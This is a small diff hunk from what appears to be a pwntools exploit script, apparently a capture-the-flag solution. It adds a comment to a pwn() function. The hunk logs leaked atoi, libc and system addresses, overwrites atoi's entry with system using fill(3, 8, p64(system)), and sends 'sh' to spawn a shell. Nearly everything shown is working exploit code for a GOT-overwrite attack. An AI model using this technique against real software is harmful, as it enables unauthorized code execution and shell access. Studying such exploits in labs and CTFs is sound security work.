@@ -110,7 +110,8 @@ def pwn():
 	log.info("atoi:   0x{:x}".format(atoi))
 	log.info("Libc:   0x{:x}".format(libc))
 	log.info("system: 0x{:x}".format(system))
-
+	
+	# atoi => system
 	fill(3, 8, p64(system))
 
 	r.sendline('sh')
